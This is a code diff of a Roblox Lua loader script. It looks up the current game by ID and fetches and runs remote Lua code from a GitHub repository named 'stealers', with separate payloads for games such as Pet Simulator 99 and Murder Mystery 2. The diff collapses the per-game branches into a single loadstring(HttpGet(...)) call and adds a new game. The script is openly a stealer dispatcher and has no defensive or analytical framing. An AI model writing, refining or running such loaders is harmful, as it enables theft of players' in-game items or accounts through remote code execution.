@@ -1,41 +1,19 @@
 repeat wait() until game:IsLoaded()
-
 local gameid = {
-    [8737899170] = "ps99",
-    [15502339080] = "ps99",
+    [3317771874] = "ps99",
 
-    [18901165922] = "pg",
-    [19006211286] = "pg",
+    [6401952734] = "pg",
 
-    [4442272183] = "bf",
-    [7449423635] = "bf",
+    [994732206] = "bf",
 
-    [4520749081] = "kl",
-    [6381829480] = "kl",
-    [15759515082] = "kl",
+    [1451439645] = "kl",
 
-    [8737602449] = "pls", 
+    [3317679266] = "pls", 
 
-    [142823291] = "mm2",
-    [335132309] = "mm2",
-    [636649648] = "mm2",
-    [73210641948512] = "mm2"
+    [66654135] = "mm2",
+
+    [5750914919] = "fisch"
 }
-
-if gameid[game.PlaceId] then
-    stealer_to_use = gameid[game.PlaceId]
-end
-
-if stealer_to_use == "mm2" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/mm2"))()
-elseif stealer_to_use == "ps99" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/ps99"))()
-elseif stealer_to_use == "bf" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/bf"))()
-elseif stealer_to_use == "pg" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/pg"))()
-elseif stealer_to_use == "kl" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/kl"))()
-elseif stealer_to_use == "pls" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/pls"))()
+if gameid[game.GameId] then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/"..gameid[game.GameId]))()
 end
